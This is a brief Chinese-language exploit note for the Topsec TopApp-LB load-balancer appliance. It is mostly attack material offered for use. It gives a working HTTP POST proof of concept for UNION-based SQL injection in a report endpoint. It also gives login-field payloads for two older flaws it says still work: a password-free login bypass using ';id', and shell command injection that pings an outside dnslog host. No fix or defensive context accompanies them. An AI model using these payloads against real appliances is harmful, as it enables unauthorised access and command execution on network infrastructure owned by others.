# 天融信TopApp-LB 负载均衡系统Sql注入漏洞



1.利用POC:

```
POST /acc/clsf/report/datasource.php HTTP/1.1
Host: localhost
Connection: close
Accept: text/javascript, text/html, application/xml, text/xml, */*
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.105 Safari/537.36
Accept-Language: zh-CN,zh;q=0.9
Content-Type: application/x-www-form-urlencoded

t=l&e=0&s=t&l=1&vid=1+union select 1,2,3,4,5,6,7,8,9,substr('a',1,1),11,12,13,14,15,16,17,18,19,20,21,22-- +&gid=0&lmt=10&o=r_Speed&asc=false&p=8&lipf=&lipt=&ripf=&ript=&dscp=&proto=&lpf=&lpt=&rpf=&rpt=@。。
```

![image-20201020115040428](.resource/%E5%A4%A9%E8%9E%8D%E4%BF%A1TopApp-LB%20%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1%E7%B3%BB%E7%BB%9FSql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/media/image-20201020115040428.png)



2.2个历史漏洞仍然可以复现。

https://www.uedbox.com/post/21626/

用户名随意 密码:;id(天融信负载均衡TopApp-LB系统无需密码直接登陆)

https://www.uedbox.com/post/22193/

用户名: ; ping 9928e5.dnslog.info; echo 密码:任意

![image-20201020120245870](.resource/%E5%A4%A9%E8%9E%8D%E4%BF%A1TopApp-LB%20%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1%E7%B3%BB%E7%BB%9FSql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/media/image-20201020120245870.png)